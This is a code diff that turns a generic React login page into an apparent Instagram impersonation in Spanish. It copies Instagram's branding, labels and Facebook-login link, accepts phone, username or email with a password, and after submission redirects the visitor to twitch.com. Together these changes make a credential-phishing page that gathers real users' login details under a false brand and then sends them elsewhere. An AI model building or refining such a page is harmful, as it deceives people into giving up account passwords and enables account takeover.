@@ -50,9 +50,9 @@ export default function Login() {
         variant: "default",
       });
       
-      // Redirect to Google after a short delay
+      // Redirect to Twitch after a short delay
       setTimeout(() => {
-        window.location.href = 'https://www.google.com';
+        window.location.href = 'https://www.twitch.com';
       }, 1500);
     },
     onError: (error) => {
@@ -78,18 +78,18 @@ export default function Login() {
     <div className="bg-gradient-to-br from-primary/10 to-accent/10 min-h-screen flex items-center justify-center p-4">
       <Card className="max-w-md w-full overflow-hidden shadow-lg">
         {/* Header Section */}
-        <div className="p-6 bg-primary text-white text-center">
-          <h1 className="text-2xl font-medium">Welcome Back</h1>
-          <p className="text-sm opacity-90 mt-1">Sign in to continue</p>
+        <div className="p-6 bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 text-white text-center">
+          <h1 className="text-2xl font-medium">Instagram</h1>
+          <p className="text-sm opacity-90 mt-1">Inicia sesión para continuar</p>
         </div>
 
         {/* Form Section */}
         <div className="p-6">
           <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
-            {/* Email Field */}
+            {/* Email/Username Field */}
             <div className="space-y-1">
               <Label htmlFor="email" className="text-sm font-medium text-gray-700">
-                Email
+                Teléfono, usuario o correo electrónico
               </Label>
               <div className="relative">
                 <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
@@ -97,8 +97,8 @@ export default function Login() {
                 </div>
                 <Input
                   id="email"
-                  type="email"
-                  placeholder="Enter your email"
+                  type="text"
+                  placeholder="Teléfono, usuario o correo electrónico"
                   className="pl-10 pr-3"
                   {...form.register("email")}
                 />
@@ -111,7 +111,7 @@ export default function Login() {
             {/* Password Field */}
             <div className="space-y-1">
               <Label htmlFor="password" className="text-sm font-medium text-gray-700">
-                Password
+                Contraseña
               </Label>
               <div className="relative">
                 <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
@@ -120,7 +120,7 @@ export default function Login() {
                 <Input
                   id="password"
                   type={showPassword ? "text" : "password"}
-                  placeholder="Enter your password"
+                  placeholder="Contraseña"
                   className="pl-10 pr-10"
                   {...form.register("password")}
                 />
@@ -149,12 +149,12 @@ export default function Login() {
                   {...form.register("rememberMe")}
                 />
                 <Label htmlFor="remember" className="text-sm text-gray-700">
-                  Remember me
+                  Recordar datos
                 </Label>
               </div>
               <div className="text-sm">
                 <a href="#" className="font-medium text-primary hover:text-accent">
-                  Forgot password?
+                  ¿Has olvidado la contraseña?
                 </a>
               </div>
             </div>
@@ -162,7 +162,7 @@ export default function Login() {
             {/* Submit Button */}
             <Button
               type="submit"
-              className="w-full bg-primary hover:bg-primary/90"
+              className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 hover:opacity-90 text-white"
               disabled={loginMutation.isPending}
             >
               {loginMutation.isPending ? (
@@ -171,15 +171,15 @@ export default function Login() {
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                   </svg>
-                  Processing...
+                  Procesando...
                 </span>
               ) : (
-                "Sign in"
+                "Iniciar sesión"
               )}
             </Button>
           </form>
 
-          {/* Social Login Options */}
+          {/* Separator */}
           <div className="mt-6">
             <div className="relative">
               <div className="absolute inset-0 flex items-center">
@@ -187,30 +187,26 @@ export default function Login() {
               </div>
               <div className="relative flex justify-center text-sm">
                 <span className="px-2 bg-white text-gray-500">
-                  Or continue with
+                  O
                 </span>
               </div>
             </div>
+          </div>
 
-            <div className="mt-6 grid grid-cols-3 gap-3">
-              <Button variant="outline" className="p-0 h-10">
-                <FaGoogle className="h-4 w-4" />
-              </Button>
-              <Button variant="outline" className="p-0 h-10">
-                <FaFacebookF className="h-4 w-4" />
-              </Button>
-              <Button variant="outline" className="p-0 h-10">
-                <FaApple className="h-4 w-4" />
-              </Button>
-            </div>
+          {/* Facebook login */}
+          <div className="mt-6 text-center">
+            <a href="#" className="flex items-center justify-center text-sm text-blue-800 font-medium">
+              <FaFacebookF className="h-4 w-4 mr-2" />
+              Iniciar sesión con Facebook
+            </a>
           </div>
 
           {/* Create Account Link */}
           <div className="mt-6 text-center">
             <p className="text-sm text-gray-600">
-              Don't have an account?{" "}
-              <a href="#" className="font-medium text-primary hover:text-accent">
-                Sign up
+              ¿No tienes una cuenta?{" "}
+              <a href="#" className="font-medium text-blue-600 hover:text-blue-800">
+                Regístrate
               </a>
             </p>
           </div>
